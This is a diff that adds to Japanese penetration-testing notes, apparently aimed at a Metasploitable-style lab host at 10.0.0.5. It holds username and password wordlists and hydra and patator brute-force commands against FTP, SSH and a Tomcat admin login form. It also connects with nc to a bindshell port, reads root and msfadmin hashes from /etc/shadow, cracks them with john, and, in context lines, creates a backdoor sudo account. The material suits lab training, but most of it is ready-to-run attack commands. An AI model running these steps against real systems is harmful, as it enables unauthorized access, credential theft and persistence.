@@ -210,3 +210,51 @@ exploit
 # root権限なので大抵のことはできる（例: バックドア用アカウント作成）
 useradd -m newuser -G sudo -s /bin/bash; passwd newuser
 ```
+
+### FTPアカウントを攻撃
+
+```bash
+# userlist.txt
+root
+sys
+msfadmin
+admin
+user
+service
+postgres
+tomcat
+
+# password.txt
+user
+password
+12345678
+msfadmin
+root
+guest
+batman
+asdfasdf
+tomcat
+
+# brute force attack
+# FTP
+hydra -L ./userlist.txt -P ./password.txt -t 8 10.0.0.5 ftp
+# SSH（タスク数が大きいと警告されるため4に）
+hydra -L ./userlist.txt -P ./password.txt -t 4 ssh://10.0.0.5:22
+# patator（[ERROR] target ssh://10.0.0.5:22/ does not support password authenticationが表示されるときはこちらを使う）
+patator ssh_login host=10.0.0.5 user=FILE0 password=FILE1 0=./userlist.txt 1=./password.txt
+```
+
+```bash
+nc 10.0.0.5 1524
+
+cat /etc/shadow | grep -E "^root|^msfadmin"
+
+# 総当り攻撃
+john --incremental password.txt
+```
+
+### HydraでHTTPの認証解析
+
+```bash
+hydra -L userlist.txt -P password.txt -s 8180 10.0.0.5 http-post-form "/admin/j_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password"
+```
